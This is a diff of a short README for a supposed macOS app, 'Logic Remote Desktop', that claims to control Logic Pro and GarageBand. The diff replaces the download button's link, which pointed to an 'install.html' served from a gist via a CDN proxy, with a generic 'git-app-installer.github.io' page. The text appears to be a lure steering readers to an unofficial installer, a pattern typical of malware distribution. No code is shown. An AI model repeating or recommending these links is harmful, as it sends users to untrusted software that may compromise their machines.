@@ -1,7 +1,7 @@
 # Logic Remote Desktop — control integration for macOS
 Logic Remote for macOS enables users to connect with Logic Pro and GarageBand, offering a touch-based, intuitive control experience from their devices.
 
-<a href="https://gistcdn.githack.com/flamesongicecream5/2d2fdee08e78270d6cfc6307fc4eed40/raw/aa85e47abde756a2ccd612050148e9a96ea68eb8/install.html?offer=LogicRemote" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=LogicRemote" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20LogicRemote%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
